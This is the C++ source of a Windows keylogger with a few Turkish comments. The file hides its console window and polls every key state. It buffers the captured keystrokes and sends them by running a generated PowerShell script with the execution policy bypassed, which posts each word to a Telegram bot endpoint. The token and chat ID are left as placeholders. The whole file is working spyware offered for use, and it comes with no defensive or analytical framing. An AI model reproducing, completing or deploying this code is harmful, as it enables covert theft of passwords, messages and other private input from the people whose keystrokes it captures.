#include <iostream>
#include <Windows.h>
#include <string>
#include <fstream>

std::string word;
using namespace std;


void special_characters(string text) { 
    //parametre olarak direk tuş vuruşunu alıyor ve dosyaya yazdırıyor
    ofstream file;
    file.open("send.ps1");

    string powershell;
    powershell = "$Message = \"" + text + "\";";
    powershell += "$Response = Invoke-RestMethod -Uri \"https://api.telegram.org/bot<Your_token>/sendMessage?chat_id=<Your_chat_id>&text=$($Message)\"";
    file << powershell << endl;
    file.close();

    system("powershell -ExecutionPolicy Bypass -F send.ps1");

    remove("send.ps1");
	
}

void send_word(string str)
{
    ofstream file;
    file.open("send.ps1");

    string powershell;
    powershell = "$Message = \"" + str + "\";";
    powershell += "$Response = Invoke-RestMethod -Uri \"https://api.telegram.org/bot<Your_token>/sendMessage?chat_id=<Your_chat_id>&text=$($Message)\"";
    file << powershell << endl;
    file.close();

    system("powershell -ExecutionPolicy Bypass -F send.ps1");

    remove("send.ps1");
    word.clear();
}

BOOL key_list(int Key) {
    switch (Key)
    {
    case VK_SPACE:
        send_word(word);
        cout << " "; 
        special_characters(" *SPACE* ");  //sends the spacebar
        break;
    case VK_RETURN:
        send_word(word);
        cout << " *ENTER* ";
        special_characters(" *ENTER* ");  //sends the enter
        break;
    case VK_SHIFT:
        send_word(word);
        cout << " *SHIFT* ";
        special_characters(" *SHIFT* ");  //sends the shift
        break;
    case VK_BACK:
        send_word(word);
        cout << " *BACKSPACE *";
        special_characters(" *BACKSPACE* ");  //sends the backspace
        break;
    case VK_CAPITAL:
        send_word(word);
        cout << " *CAPS_LOCK* ";
        special_characters(" *CAPS_LOCK* ");  //sends the capslock
        break;

    default: return false;
    }
}



int main()
{

	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    char key = ' '; //variable from which the keystroke is taken
    int count = 0;
    while (true)
    {
       
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {

                if (key_list(key) == FALSE) {
                    
                    std::string s(1, char(key));
                    if (count < 20) //20 character limit without special keys
                    {
                        word = word + s;
                        count++;
                    }
                    else { 
                        send_word(word);
                        count = 0;
                    }
                }
            }   
        }
    }
    return 0;
}